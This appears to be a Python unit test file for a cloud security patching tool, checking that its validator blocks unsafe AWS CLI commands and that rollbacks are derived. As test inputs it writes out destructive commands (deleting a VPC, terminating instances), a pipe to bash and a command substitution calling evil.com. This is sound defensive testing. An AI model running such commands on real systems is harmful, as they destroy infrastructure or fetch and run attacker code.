"""Unit tests for patching engine, validator, and rollback generator."""

from cloudsec_rag.core.types import BenchmarkReference, BlastRadius, PatchAction, PatchType
from cloudsec_rag.patching.rollback import RollbackGenerator
from cloudsec_rag.patching.validator import PatchValidator


def test_validator_blocks_destructive_commands():
    validator = PatchValidator()
    destructive_patch = PatchAction(
        patch_id="P-01",
        patch_type=PatchType.AWS_CLI,
        command="aws ec2 delete-vpc --vpc-id vpc-123456",
        explanation="Attempting to delete vpc"
    )
    is_valid, reasons = validator.validate(destructive_patch)
    assert is_valid is False
    assert any("forbidden pattern" in r for r in reasons)


def test_validator_approves_safe_remediation():
    validator = PatchValidator()
    safe_patch = PatchAction(
        patch_id="P-02",
        patch_type=PatchType.AWS_CLI,
        command="aws s3api put-public-access-block --bucket my-bucket --public-access-block-configuration BlockPublicAcls=true",
        explanation="Safe S3 lockdown"
    )
    is_valid, reasons = validator.validate(safe_patch)
    assert is_valid is True
    assert len(reasons) == 0


def test_automated_rollback_derivation():
    generator = RollbackGenerator()
    patch = PatchAction(
        patch_id="P-03",
        patch_type=PatchType.AWS_CLI,
        command="aws s3api put-public-access-block --bucket vault-bkt --public-access-block-configuration BlockPublicAcls=true",
        explanation="Enforce public access block"
    )
    rollback = generator.generate_rollback(patch)
    assert "delete-public-access-block" in rollback.command
    assert rollback.target_patch_id == "P-03"


def test_validator_blocks_shell_pipes_and_subshells():
    validator = PatchValidator()
    # Pipe to bash
    piped_patch = PatchAction(
        patch_id="P-PIPE",
        patch_type=PatchType.AWS_CLI,
        command="aws s3 cp s3://bkt/test - | bash",
        explanation="Shell pipe exploit"
    )
    is_valid, reasons = validator.validate(piped_patch)
    assert is_valid is False
    assert any("shell injection pattern" in r or "not an authorized cloud CLI tool" in r for r in reasons)

    # Command substitution
    subshell_patch = PatchAction(
        patch_id="P-SUB",
        patch_type=PatchType.AWS_CLI,
        command="aws iam attach-role-policy --role-name $(curl evil.com)",
        explanation="Command substitution exploit"
    )
    is_valid_sub, reasons_sub = validator.validate(subshell_patch)
    assert is_valid_sub is False
    assert any("forbidden shell injection" in r for r in reasons_sub)


def test_engine_blocks_both_command_and_iac_when_invalid():
    from cloudsec_rag.core.types import CloudProvider, CloudSecurityIncident, Severity
    from cloudsec_rag.patching.engine import SecurityPatchingEngine
    engine = SecurityPatchingEngine()
    incident = CloudSecurityIncident(
        incident_id="INC-TEST",
        provider=CloudProvider.AWS,
        resource_id="res-01",
        event_name="TestEvent",
        severity_hint=Severity.HIGH,
        raw_payload="",
        sanitized_payload=""
    )
    # Dangerous benchmark with malicious command
    bench = BenchmarkReference(
        citation_id="CIS-TEST-99",
        framework="TEST",
        title="Bad Benchmark",
        description="Dangerous command",
        rationale="None",
        impact="Critical",
        remediation_command="aws ec2 terminate-instances --instance-ids i-12345",
        rollback_command="echo rollback",
        iac_template="resource 'aws_instance' 'test' { destroy = true }"
    )
    patch = engine.generate_patch(incident, bench)
    assert patch.is_destructive is True
    assert "# SAFETY WARNING: Automated command was blocked" in patch.command
    assert "# SAFETY WARNING: Automated IaC patch was blocked" in patch.iac_code
